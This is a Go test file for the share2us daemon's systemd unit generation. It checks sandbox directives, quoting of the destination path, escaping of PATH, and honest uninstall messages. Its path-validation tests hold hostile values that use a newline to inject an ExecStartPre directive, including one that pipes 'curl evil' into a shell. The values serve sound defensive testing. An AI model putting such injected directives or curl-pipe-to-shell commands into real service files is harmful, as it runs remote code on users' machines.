// SPDX-License-Identifier: GPL-3.0-only
// Copyright (C) 2026 Hassan Khurram

//go:build linux

package daemon

import (
	"bytes"
	"path/filepath"
	"strings"
	"testing"
)

func TestRenderUnit(t *testing.T) {
	unit := renderUnit("/usr/bin/share2us", "/srv/incoming", false, "")
	for _, want := range []string{
		"ExecStart=/usr/bin/share2us daemon run",
		"WantedBy=default.target",
		"NoNewPrivileges=true",
		"ProtectHome=read-only",
		"/srv/incoming", // dest dir folded into ReadWritePaths
		"%t/share2us",   // runtime dir for the control socket
	} {
		if !strings.Contains(unit, want) {
			t.Errorf("unit missing %q:\n%s", want, unit)
		}
	}
}

func TestRenderUnitNoDest(t *testing.T) {
	unit := renderUnit("/usr/bin/share2us", "", false, "")
	if strings.Contains(unit, "ReadWritePaths= \n") {
		t.Error("empty dest left a trailing space in ReadWritePaths")
	}
}

// §AJ low batch: destDir was interpolated into the systemd unit unquoted, so a
// newline in a folder name would end the ReadWritePaths line and start a new
// DIRECTIVE -- adding, say, ExecStartPre to a service that runs on every login.
// Self-inflicted, since the value is the operator's own --dest, but a unit file
// is not where you want to discover it.
func TestUnitPathRejectsWhatWouldBreakTheUnit(t *testing.T) {
	for _, bad := range []string{
		"/home/me/inbox\nExecStartPre=/bin/sh -c 'curl evil|sh'",
		"/home/me/inbox\rExecStart=/bin/false",
		"/home/me/in\x00box",
		`/home/me/"quoted"`,
	} {
		if err := validUnitPath(bad); err == nil {
			t.Errorf("accepted a path that would break the unit: %q", bad)
		}
	}
	for _, good := range []string{
		"",
		"/home/me/Downloads",
		"/home/me/My Files/inbox",
		"/home/me/файлы",
	} {
		if err := validUnitPath(good); err != nil {
			t.Errorf("rejected a legitimate path %q: %v", good, err)
		}
	}
}

// A path with spaces must land as ONE ReadWritePaths entry, not several.
func TestUnitQuotesTheDestinationPath(t *testing.T) {
	unit := renderUnit("/usr/local/bin/s2u", "/home/me/My Files/inbox", false, "")
	if !strings.Contains(unit, `ReadWritePaths=%h/.config/share2us %h/.cache/share2us %t/share2us "/home/me/My Files/inbox"`) {
		t.Fatalf("destination not quoted as one entry:\n%s", unit)
	}
	// An empty destination adds nothing.
	if strings.Contains(renderUnit("/usr/local/bin/s2u", "", false, ""), `""`) {
		t.Fatal("an empty destination produced an empty quoted entry")
	}
}

// Uninstall must be idempotent AND honest: exit cleanly when nothing is
// installed, but say so rather than claiming a removal.
//
// All three platforms got this wrong, in two different directions. darwin and
// linux tolerated a missing unit file and then printed "Removed ..." anyway,
// reporting an action that never happened -- found on a Mac where the daemon
// had never been installed. Windows did the opposite and returned an error, so
// a script that uninstalled twice failed on the second run.
func TestServiceUninstallSaysNothingWasInstalled(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))

	var buf bytes.Buffer
	if err := ServiceUninstall(&buf); err != nil {
		t.Fatalf("ServiceUninstall() on a clean machine error = %v, want nil (idempotent)", err)
	}
	got := buf.String()
	serviceCallsMu.Lock()
	calls := strings.Join(serviceCalls, "; ")
	serviceCallsMu.Unlock()
	if !strings.Contains(calls, "systemctl --user disable --now s2u-daemon.service") {
		t.Errorf("uninstall should disable the unit (through the test stub), calls: %s", calls)
	}
	if strings.Contains(got, "Removed") {
		t.Errorf("claimed a removal that did not happen: %q", got)
	}
	if !strings.Contains(got, "not installed") {
		t.Errorf("output = %q, want it to say nothing was installed", got)
	}
}

// With agents bound, the daemon runs Claude/Codex in the user's projects: home
// must be writable and /tmp shared, while system dirs stay read-only and it can
// never gain privileges. The receiver-only sandbox would make every agent run fail.
func TestAgentUnitLetsAgentsWorkButStaysUnprivileged(t *testing.T) {
	unit := renderUnit("/usr/bin/share2us", "", true, "/home/me/.local/bin:/usr/bin")
	for _, bad := range []string{"ProtectHome=read-only", "PrivateTmp=true", "ProtectSystem=strict", "RestrictAddressFamilies"} {
		if strings.Contains(unit, bad) {
			t.Fatalf("agent unit still has %q, which breaks agent runs:\n%s", bad, unit)
		}
	}
	for _, want := range []string{"NoNewPrivileges=true", "ProtectSystem=full", `Environment="PATH=/home/me/.local/bin:/usr/bin"`} {
		if !strings.Contains(unit, want) {
			t.Fatalf("agent unit lacks %q:\n%s", want, unit)
		}
	}
	// The receiver-only unit keeps its tight sandbox.
	recv := renderUnit("/usr/bin/share2us", "", false, "/usr/bin")
	if !strings.Contains(recv, "ProtectHome=read-only") || !strings.Contains(recv, `Environment="PATH=/usr/bin"`) {
		t.Fatalf("receiver unit lost its sandbox or PATH:\n%s", recv)
	}
}

// PATH goes inside a quoted Environment= line: nothing in it may add a
// directive or expand as a specifier or variable.
func TestUnitPathEscaping(t *testing.T) {
	v, ok := unitEnvPath(`/a%b:/c$d:/e\\f`)
	if !ok || v != `/a%%b:/c$$d:/e\\\\f` {
		t.Fatalf("escaped = %q, %v", v, ok)
	}
	for _, bad := range []string{"/bin\nExecStartPre=/evil", `/bin"x`, ""} {
		if _, ok := unitEnvPath(bad); ok {
			t.Fatalf("unsafe PATH %q accepted", bad)
		}
	}
	unit := renderUnit("/usr/bin/share2us", "", true, "/bin\nExecStartPre=/evil")
	if strings.Contains(unit, "ExecStartPre") || strings.Contains(unit, "Environment=") {
		t.Fatalf("an unsafe PATH reached the unit:\n%s", unit)
	}
}

func TestUnitDestDirRoundTrips(t *testing.T) {
	unit := renderUnit("/usr/bin/share2us", "/home/me/My Files/inbox", false, "/usr/bin")
	if got := unitDestDir(unit); got != "/home/me/My Files/inbox" {
		t.Fatalf("unitDestDir = %q", got)
	}
	if got := unitDestDir(renderUnit("/usr/bin/share2us", "", true, "/usr/bin")); got != "" {
		t.Fatalf("agent unit dest = %q, want empty", got)
	}
}
